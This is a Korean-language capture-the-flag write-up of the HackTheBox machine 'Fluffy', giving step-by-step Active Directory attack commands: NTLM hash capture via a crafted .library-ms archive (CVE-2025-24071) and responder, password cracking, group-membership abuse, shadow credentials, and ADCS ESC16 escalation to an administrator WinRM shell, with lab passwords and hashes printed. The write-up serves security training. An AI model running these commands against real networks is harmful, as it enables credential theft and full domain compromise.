# Fluffy - HackTheBox
## Recon
```bash
sudo nmap -p 139,3268,3269,389,445,464,49667,49689,49690,49697,49707,49720,53,593,5985,636,88,9389 -sC -sV -vv -oA fluffy 10.129.232.88
```
<img width="1205" height="227" alt="image" src="https://github.com/user-attachments/assets/a702c6f3-1005-478d-bd63-92db7fcbcccc" />
<img width="1205" height="181" alt="image" src="https://github.com/user-attachments/assets/f14e14c3-9da1-4e18-8e0e-6f45aeba734e" />
<img width="1205" height="68" alt="image" src="https://github.com/user-attachments/assets/0190d21a-4823-45d7-8082-23a9efd5672e" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)
- CA

<br>

- `/etc/hosts`에 `dc01.fluffy.htb` 추가.
<img width="1205" height="70" alt="image" src="https://github.com/user-attachments/assets/de6cef69-9a11-4731-8af4-cb33c9e1cb4f" />

---
## Auth as p.agila
- 주어진 계정으로 유저목록 수집.
```bash
nxc smb 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --users
```
<img width="1205" height="452" alt="image" src="https://github.com/user-attachments/assets/17ad7d19-5aa5-4e75-a0f3-3cb5e3261de5" />

<br>
<br>

- `SMB` 탐색.
```bash
smbmap -u j.fleischman -p 'J0elTHEM4n1990!' -H 10.129.232.88
```
<img width="1205" height="205" alt="image" src="https://github.com/user-attachments/assets/abdf4cfe-68d7-4868-bc5b-7bcea321de0c" />

<br>
<br>

- `/IT`경로에서 `Upgrade_Notice.pdf` 발견.
```bash
smbclient -U j.fleischman //10.129.232.88/IT
```
<img width="1202" height="318" alt="image" src="https://github.com/user-attachments/assets/a3f608c0-837d-418b-afa2-4d8bd90248cf" />

<br>
<br>

- 취약점 보고서로 보임.
<img width="1443" height="677" alt="image" src="https://github.com/user-attachments/assets/5e9fa9a4-a33e-47c8-b67f-26a0cdcd8090" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2025-24071
<img width="1014" height="338" alt="image" src="https://github.com/user-attachments/assets/305fb8a5-407c-4e7d-8871-e73d93debaf7" />

<br>
<br>

- https://www.exploit-db.com/exploits/52310
- 압축파일이 압축이 해제되는 과정에 `.library-ms`파일이 존재한다면 SMB 인증을 요청하게 되면서 `NTLM`해시가 노출되는 취약점.
<img width="798" height="87" alt="image" src="https://github.com/user-attachments/assets/99ebf36d-aebe-4750-b6a9-da06ffcd7d77" />

<br>
<br>

- `.library-ms`를 생성해서 압축하는 코드.
```bash
searchsploit -m 52310
```
<img width="861" height="491" alt="image" src="https://github.com/user-attachments/assets/812577f4-dbb6-4119-87bb-825e3f44fc1f" />

<br>
<br>

- `ex.library-ms` 생성.
<img width="1204" height="267" alt="image" src="https://github.com/user-attachments/assets/8b537b33-ebd7-4ea4-b1df-ea723121a1c2" />

<br>
<br>

- `ex.zip` 생성.
```bash
zip ex.zip ex.library-ms
```
<img width="1204" height="74" alt="image" src="https://github.com/user-attachments/assets/3cc0f1f7-325b-4dfe-a817-8a8648478994" />

<br>
<br>

- SMB의 `IT`경로에 쓰기 권한이 있어 `responder`를 실행중인 상태에서 `ex.zip` 업로드 시도.
- `p.agila` 해시 획득.
```bash
sudo responder -I tun0 -v
```
<img width="1204" height="203" alt="image" src="https://github.com/user-attachments/assets/b8734950-6d80-4313-9b09-e39a8a54f362" />

<br>
<br>

- 크래킹 시도.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1204" height="228" alt="image" src="https://github.com/user-attachments/assets/b0df3569-87f3-4a8e-8733-6a32f8aa4753" />

<br>
<br>

- `p.agila:prometheusx-303` 로그인 성공.
<img width="1204" height="121" alt="image" src="https://github.com/user-attachments/assets/3f76a0ad-530a-4c0a-a73b-1b1b8a3600e7" />

---
## Auth as ca_svc
- `SERVICE ACCOUNTS`로 `GenericAll`권한 발견.
<img width="946" height="338" alt="image" src="https://github.com/user-attachments/assets/b73d9ae4-99f6-469e-8dae-aac23dedecf2" />

<br>
<br>

- `p.agila`를 `service accounts` 그룹에 추가.
```bash
net rpc group addmem 'service accounts' 'p.agila' -U fluffy.htb/p.agila%'prometheusx-303' -S dc01.fluffy.htb
```
<img width="1202" height="211" alt="image" src="https://github.com/user-attachments/assets/81b587a1-cdf8-4997-8891-0839a0cd11d5" />

<br>
<br>

- 3개의 계정으로 `GenericWrite`권한 발견.
<img width="921" height="433" alt="image" src="https://github.com/user-attachments/assets/12080955-da2b-4bf8-8f65-09750671504c" />

<br>
<br>

- `Shadow credential`공격으로 `ca_svc` 해시 요청.
```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account 'ca_svc' -dc-ip 10.129.232.88 -target-ip 10.129.232.88
```
<img width="1203" height="558" alt="image" src="https://github.com/user-attachments/assets/4e4ff271-5f19-43d8-b83b-bc7f237ad51c" />

<br>
<br>

- `ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8` 로그인 성공.
```bash
nxc smb 10.129.22.249 -u ca_svc -H ca0f4f9e9eb8a092addf53bb03fc98c8
```
<img width="1203" height="120" alt="image" src="https://github.com/user-attachments/assets/2a48e1eb-8e12-46d4-941a-6c95dd574590" />

---
## Privesc
- CA 취약점 확인.
- ESC16
```bash
certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target dc01.fluffy.htb -text -stdout -vulnerable
```
<img width="1203" height="356" alt="image" src="https://github.com/user-attachments/assets/7a6caafe-f514-4c5c-8b38-3ab27f30a12d" />

<br>
<br>

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally
- `p.agila`계정이 `ca_svc` 계정에 대해서 `GenericWrite`권한을 갖고 있음.
<img width="1152" height="110" alt="image" src="https://github.com/user-attachments/assets/fffa884b-2c5a-4488-92ee-a2e7eb5dcf93" />

<br>
<br>

<img width="761" height="260" alt="image" src="https://github.com/user-attachments/assets/a36eea84-6e27-4992-8b5a-e6ea5d50bb24" />

<br>
<br>

- `service accounts`그룹에서 `p.agila`가 주기적으로 제외되어서 재실행한 후에 `ca_svc`의 upn 업데이트.
```bash
net rpc group addmem 'service accounts' 'p.agila' -U fluffy.htb/p.agila%'prometheusx-303' -S dc01.fluffy.htb

certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.232.88 -upn administrator -user ca_svc update
```
<img width="1204" height="225" alt="image" src="https://github.com/user-attachments/assets/f0b3583c-0cab-423f-8961-5ee058a16224" />

<br>
<br>

- 이전에 획득한 `ca_svc`의 인증서를 가지고 `administrator`의 인증서 요청.
```bash
export KRB5CCNAME=ca_svc.ccache

certipy-ad req -k -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-dc01-ca -template User
```
<img width="1204" height="293" alt="image" src="https://github.com/user-attachments/assets/4de392b1-5fa6-4276-b9e2-28d011554f63" />

<br>
<br>

- `ca_svc`의 upn을 이전으로 되돌림.
```bash
certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.232.88 -upn ca_svc@fluffy.htb -user ca_svc update
```
<img width="1204" height="163" alt="image" src="https://github.com/user-attachments/assets/39e151e4-cc20-49ef-9209-b1b0454fcc6b" />

<br>
<br>

- `administrator` 해시 획득.
```bash
certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain fluffy.htb
```
<img width="1204" height="295" alt="image" src="https://github.com/user-attachments/assets/792d7acb-b124-4ffd-9534-00835677de62" />

<br>
<br>

- `administrator:8da83a3fa618b6e3a00e93f676c92a6e` 로그인 성공.
```bash
nxc winrm 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```
<img width="1204" height="275" alt="image" src="https://github.com/user-attachments/assets/45984cf9-7c4e-4af3-bf7e-636f03b72c98" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```
<img width="1204" height="291" alt="image" src="https://github.com/user-attachments/assets/f40dee82-6083-48b1-bd54-5bbd46512791" />

---
## FLAG
- `c:\users\winrm_svc\desktop\user.txt`
<img width="1204" height="211" alt="image" src="https://github.com/user-attachments/assets/3c01585f-eb46-4e18-b37c-34b980f05284" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1204" height="207" alt="image" src="https://github.com/user-attachments/assets/e79bf943-589c-4ff0-97e6-fb415523086c" />
